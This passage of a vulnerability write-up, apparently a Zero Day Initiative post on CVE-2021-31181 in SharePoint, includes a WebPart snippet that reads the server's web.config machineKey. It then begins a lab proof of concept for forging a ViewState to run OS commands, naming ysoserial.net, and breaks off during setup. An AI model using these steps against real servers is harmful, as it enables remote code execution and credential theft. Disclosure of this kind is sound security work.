          <td id="file-cve-2021-31181-snippet-5-ascx-LC6" class="blob-code blob-code-inner js-file-line">      <span class="pl-e">XPath</span>=<span class="pl-s"><span class="pl-pds">"</span>/configuration/system.web/machineKey<span class="pl-pds">"</span></span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-5-ascx-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-cve-2021-31181-snippet-5-ascx-LC7" class="blob-code blob-code-inner js-file-line">      <span class="pl-e">datafile</span>=<span class="pl-s"><span class="pl-pds">"</span>c:/inetpub/wwwroot/wss/VirtualDirectories/80/web.config<span class="pl-pds">"</span></span> /&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-5-ascx-L8" class="blob-num js-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-cve-2021-31181-snippet-5-ascx-LC8" class="blob-code blob-code-inner js-file-line">  &lt;/<span class="pl-ent">DataSources</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-5-ascx-L9" class="blob-num js-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-cve-2021-31181-snippet-5-ascx-LC9" class="blob-code blob-code-inner js-file-line">  &lt;<span class="pl-ent">xsl</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-5-ascx-L10" class="blob-num js-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-cve-2021-31181-snippet-5-ascx-LC10" class="blob-code blob-code-inner js-file-line">      &lt;<span class="pl-ent">xsl:stylesheet</span> <span class="pl-e">version</span>=<span class="pl-s"><span class="pl-pds">"</span>2.0<span class="pl-pds">"</span></span> <span class="pl-e">xmlns:xsl</span>=<span class="pl-s"><span class="pl-pds">"</span>http://www.w3.org/1999/XSL/Transform<span class="pl-pds">"</span></span>&gt;          </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-5-ascx-L11" class="blob-num js-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-cve-2021-31181-snippet-5-ascx-LC11" class="blob-code blob-code-inner js-file-line">          &lt;<span class="pl-ent">xsl:output</span> <span class="pl-e">method</span>=<span class="pl-s"><span class="pl-pds">"</span>xml<span class="pl-pds">"</span></span> <span class="pl-e">indent</span>=<span class="pl-s"><span class="pl-pds">"</span>yes<span class="pl-pds">"</span></span>/&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-5-ascx-L12" class="blob-num js-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-cve-2021-31181-snippet-5-ascx-LC12" class="blob-code blob-code-inner js-file-line">          &lt;<span class="pl-ent">xsl:template</span> <span class="pl-e">match</span>=<span class="pl-s"><span class="pl-pds">"</span>/<span class="pl-pds">"</span></span> &gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-5-ascx-L13" class="blob-num js-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-cve-2021-31181-snippet-5-ascx-LC13" class="blob-code blob-code-inner js-file-line">          &lt;<span class="pl-ent">xsl:copy-of</span> <span class="pl-e">select</span>=<span class="pl-s"><span class="pl-pds">"</span>.<span class="pl-pds">"</span></span>/&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-5-ascx-L14" class="blob-num js-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-cve-2021-31181-snippet-5-ascx-LC14" class="blob-code blob-code-inner js-file-line">          &lt;/<span class="pl-ent">xsl:template</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-5-ascx-L15" class="blob-num js-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-cve-2021-31181-snippet-5-ascx-LC15" class="blob-code blob-code-inner js-file-line">      &lt;/<span class="pl-ent">xsl:stylesheet</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-5-ascx-L16" class="blob-num js-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-cve-2021-31181-snippet-5-ascx-LC16" class="blob-code blob-code-inner js-file-line">  &lt;/<span class="pl-ent">xsl</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-5-ascx-L17" class="blob-num js-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-cve-2021-31181-snippet-5-ascx-LC17" class="blob-code blob-code-inner js-file-line">&lt;/<span class="pl-ent">WebPartPages:XsltListFormWebPart</span>&gt;</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/zdi-team/5cc6ab28b372215c41394358f9337293/raw/a7dae3418fc7115957588dba3aa4c49b4139d613/CVE-2021-31181-snippet-5.ascx" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/zdi-team/5cc6ab28b372215c41394358f9337293#file-cve-2021-31181-snippet-5-ascx" class="Link--inTextBlock">
          CVE-2021-31181-snippet-5.ascx
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1622577090871_50404"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">We can use the <strong>machinekey</strong> section from <strong>web.config</strong> to create a valid <strong><em>VIEWSTATE</em></strong> parameter that causes an arbitrary OS command to be executed when the ViewState is deserialized on the server.</p><p class="" style="white-space:pre-wrap;"><strong>Proof of Concept</strong></p>
</div>






















</div></div><div class="sqs-block markdown-block sqs-block-markdown" data-block-type="44" id="block-yui_3_17_2_1_1622577090871_50948"><div class="sqs-block-content"><p>For this demonstration, we use Microsoft SharePoint Server 2019 installed with all default options on Windows Server 2019 Datacenter. 
The server’s computer name is <code>sp2019.contoso.lab</code> and it is a member of the <code>contoso.lab</code> domain. The domain controller is a separate virtual machine. It has been updated to January 2021 Patch (Version 16.0.10370.20001‎) and a couple of users have been added, including “user2” as a regular, unprivileged user.</p>

</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1622577090871_52050"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">On the attacker side, we need any supported Web Browser, our PoC application for sending SOAP requests to the server, and the <a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a> tool. For this demonstration, we are using Firefox as our browser.</p><p class="" style="white-space:pre-wrap;"><strong>Getting Remote Code Execution</strong></p><p class="" style="white-space:pre-wrap;">Let’s begin by visiting our SharePoint Server and authenticating as “user2”.</p>
</div>






















</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1622577090871_52619"><div class="sqs-block-content" id="yui_3_17_2_1_1762949685278_93">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949685278_92">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:468px;" id="yui_3_17_2_1_1762949685278_91">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949685278_90">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949685278_89">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:37.82051086425781%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949685278_88">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622577658548-BLLK7I188BL1S3SWKE0K/Picture1.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622577658548-BLLK7I188BL1S3SWKE0K/Picture1.png" data-image-dimensions="468x177" data-image-focal-point="0.5,0.5" alt="Picture1.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/Picture1.png" width="468" height="177" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622577658548-BLLK7I188BL1S3SWKE0K/Picture1.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622577658548-BLLK7I188BL1S3SWKE0K/Picture1.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622577658548-BLLK7I188BL1S3SWKE0K/Picture1.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622577658548-BLLK7I188BL1S3SWKE0K/Picture1.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622577658548-BLLK7I188BL1S3SWKE0K/Picture1.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622577658548-BLLK7I188BL1S3SWKE0K/Picture1.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622577658548-BLLK7I188BL1S3SWKE0K/Picture1.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1622577090871_54222"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">Let’s create a site so that we will be the owner and have all permissions. </p><p class="" style="white-space:pre-wrap;">Click on “<strong>SharePoint</strong>” on the top panel:</p>
</div>






















</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1622577090871_55081"><div class="sqs-block-content" id="yui_3_17_2_1_1762949685278_118">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949685278_117">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:468px;" id="yui_3_17_2_1_1762949685278_116">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949685278_115">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949685278_114">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:42.94871520996094%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949685278_113">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622577692205-KJ2UWT0ASZ4GAD4QSB75/Picture2.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622577692205-KJ2UWT0ASZ4GAD4QSB75/Picture2.png" data-image-dimensions="468x201" data-image-focal-point="0.5,0.5" alt="Picture2.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/Picture2.png" width="468" height="201" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622577692205-KJ2UWT0ASZ4GAD4QSB75/Picture2.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622577692205-KJ2UWT0ASZ4GAD4QSB75/Picture2.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622577692205-KJ2UWT0ASZ4GAD4QSB75/Picture2.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622577692205-KJ2UWT0ASZ4GAD4QSB75/Picture2.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622577692205-KJ2UWT0ASZ4GAD4QSB75/Picture2.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622577692205-KJ2UWT0ASZ4GAD4QSB75/Picture2.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622577692205-KJ2UWT0ASZ4GAD4QSB75/Picture2.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1622577090871_72700"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">Now click the “<strong>+ Create Site</strong>” link:</p>
</div>






















</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1622577090871_73251"><div class="sqs-block-content" id="yui_3_17_2_1_1762949685278_134">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-below
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949685278_133">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:468px;" id="yui_3_17_2_1_1762949685278_132">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949685278_131">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949685278_130">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:52.136756896972656%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949685278_129">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647043255-92OV3E50SQWGUFFZW7NG/Picture3.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647043255-92OV3E50SQWGUFFZW7NG/Picture3.png" data-image-dimensions="468x244" data-image-focal-point="0.5,0.5" alt="Picture3.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/Picture3.png" width="468" height="244" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647043255-92OV3E50SQWGUFFZW7NG/Picture3.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647043255-92OV3E50SQWGUFFZW7NG/Picture3.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647043255-92OV3E50SQWGUFFZW7NG/Picture3.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647043255-92OV3E50SQWGUFFZW7NG/Picture3.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647043255-92OV3E50SQWGUFFZW7NG/Picture3.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647043255-92OV3E50SQWGUFFZW7NG/Picture3.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647043255-92OV3E50SQWGUFFZW7NG/Picture3.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1622577090871_74652"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">Choose <strong><em>Team Site</em></strong>.</p><p class="" style="white-space:pre-wrap;">Choose a name for the new site. In this example, it is <strong>ts01</strong>. </p>
</div>






















</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1622577090871_75202"><div class="sqs-block-content" id="yui_3_17_2_1_1762949685278_149">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949685278_148">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:468px;" id="yui_3_17_2_1_1762949685278_147">
          
        
        

        
          
            
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949685278_146">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:52.77777862548828%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949685278_145">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647075183-1BDO35X0KXP6WW3G4R97/Picture4.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647075183-1BDO35X0KXP6WW3G4R97/Picture4.png" data-image-dimensions="468x247" data-image-focal-point="0.5,0.5" alt="Picture4.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/Picture4.png" width="468" height="247" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647075183-1BDO35X0KXP6WW3G4R97/Picture4.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647075183-1BDO35X0KXP6WW3G4R97/Picture4.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647075183-1BDO35X0KXP6WW3G4R97/Picture4.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647075183-1BDO35X0KXP6WW3G4R97/Picture4.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647075183-1BDO35X0KXP6WW3G4R97/Picture4.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647075183-1BDO35X0KXP6WW3G4R97/Picture4.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647075183-1BDO35X0KXP6WW3G4R97/Picture4.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1622577090871_76646"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">Click “<strong>Finish</strong>” and the new site will be created:</p>
</div>






















</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1622577090871_77181"><div class="sqs-block-content" id="yui_3_17_2_1_1762949685278_159">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949685278_158">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:468px;" id="yui_3_17_2_1_1762949685278_157">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949685278_156">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949685278_155">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:43.376068115234375%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949685278_154">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647101741-GQF51XD5EAHSLLECCMQ6/Picture5.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647101741-GQF51XD5EAHSLLECCMQ6/Picture5.png" data-image-dimensions="468x203" data-image-focal-point="0.5,0.5" alt="Picture5.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/Picture5.png" width="468" height="203" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647101741-GQF51XD5EAHSLLECCMQ6/Picture5.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647101741-GQF51XD5EAHSLLECCMQ6/Picture5.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647101741-GQF51XD5EAHSLLECCMQ6/Picture5.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647101741-GQF51XD5EAHSLLECCMQ6/Picture5.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647101741-GQF51XD5EAHSLLECCMQ6/Picture5.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647101741-GQF51XD5EAHSLLECCMQ6/Picture5.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647101741-GQF51XD5EAHSLLECCMQ6/Picture5.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1622577090871_78577"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">Now let’s get the <strong>webId</strong> for the site. This can be done with a request to <strong><em>/_api/web/id</em></strong> :</p>
</div>






















</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1622577090871_79109"><div class="sqs-block-content" id="yui_3_17_2_1_1762949685278_175">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949685278_174">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:468px;" id="yui_3_17_2_1_1762949685278_173">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949685278_172">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949685278_171">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:18.589744567871094%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949685278_170">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647129600-GCXACD19ANSWIFNT2HLC/Picture6.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647129600-GCXACD19ANSWIFNT2HLC/Picture6.png" data-image-dimensions="468x87" data-image-focal-point="0.5,0.5" alt="Picture6.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/Picture6.png" width="468" height="87" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647129600-GCXACD19ANSWIFNT2HLC/Picture6.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647129600-GCXACD19ANSWIFNT2HLC/Picture6.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647129600-GCXACD19ANSWIFNT2HLC/Picture6.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647129600-GCXACD19ANSWIFNT2HLC/Picture6.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647129600-GCXACD19ANSWIFNT2HLC/Picture6.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647129600-GCXACD19ANSWIFNT2HLC/Picture6.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647129600-GCXACD19ANSWIFNT2HLC/Picture6.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1622577090871_80529"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">In this example, it is <strong>6e7040c8-0338-4448-914d-a7061e0fc347</strong>.</p><p class="" style="white-space:pre-wrap;">We also need the title of any existing SPlist in the current site. The “<strong><em>Documents” </em></strong>SPlist is available on most sites, but we can use any item from the <strong><em>/_layouts/15/viewlsts.aspx </em></strong>page:</p>
</div>






















</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1622577090871_81077"><div class="sqs-block-content" id="yui_3_17_2_1_1762949685278_191">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949685278_190">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:468px;" id="yui_3_17_2_1_1762949685278_189">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949685278_188">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949685278_187">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:51.28205490112305%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949685278_186">
                
                
                
                
                
                
                
